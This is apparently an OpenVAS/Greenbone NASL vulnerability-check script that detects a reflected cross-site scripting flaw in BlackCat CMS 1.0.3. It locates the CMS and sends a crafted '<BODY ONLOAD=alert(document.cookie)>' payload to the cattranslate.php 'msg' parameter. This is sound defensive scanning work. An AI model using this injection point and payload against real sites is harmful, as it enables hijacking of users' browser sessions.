if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.804749" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2014-08-25 18:48:58 +0530 (Mon, 25 Aug 2014)" );
	script_name( "BlackCat CMS Reflected Cross-Site Scripting Vulnerability" );
	script_tag( name: "summary", value: "This host is installed with BlackCat CMS and is prone to cross site
  scripting vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted exploit string via HTTP GET request and check whether it is
  possible to read cookie or not." );
	script_tag( name: "insight", value: "Flaw is due to the modules/lib_jquery/plugins/cattranslate/cattranslate.php
  script not properly sanitize input to the 'attr' and 'msg' parameter before
  returning it to users." );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in the context of an affected site." );
	script_tag( name: "affected", value: "BlackCat CMS version 1.0.3 and probably prior." );
	script_tag( name: "solution", value: "Apply the patch/update from the referenced advisory." );
	script_xref( name: "URL", value: "https://www.htbridge.com/advisory/HTB23228" );
	script_xref( name: "URL", value: "http://forum.blackcat-cms.org/viewtopic.php?f=2&t=263" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	script_xref( name: "URL", value: "http://blackcat-cms.org" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
http_port = http_get_port( default: 80 );
if(!http_can_host_php( port: http_port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/", "/blackcat", "/blackcatcms", "/cms", http_cgi_dirs( port: http_port ) ) {
	if(dir == "/"){
		dir = "";
	}
	rcvRes = http_get_cache( item: NASLString( dir, "/backend/start/index.php" ), port: http_port );
	if(ContainsString( rcvRes, ">Black Cat CMS" )){
		url = dir + "/modules/lib_jquery/plugins/cattranslate/cattranslate.php" + "?msg=%3CBODY%20ONLOAD=alert(document.cookie)%3E";
		if(http_vuln_check( port: http_port, url: url, check_header: TRUE, pattern: "<data><BODY ONLOAD=alert\\(document.cookie\\)></data>" )){
			report = http_report_vuln_url( port: http_port, url: url );
			security_message( port: http_port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

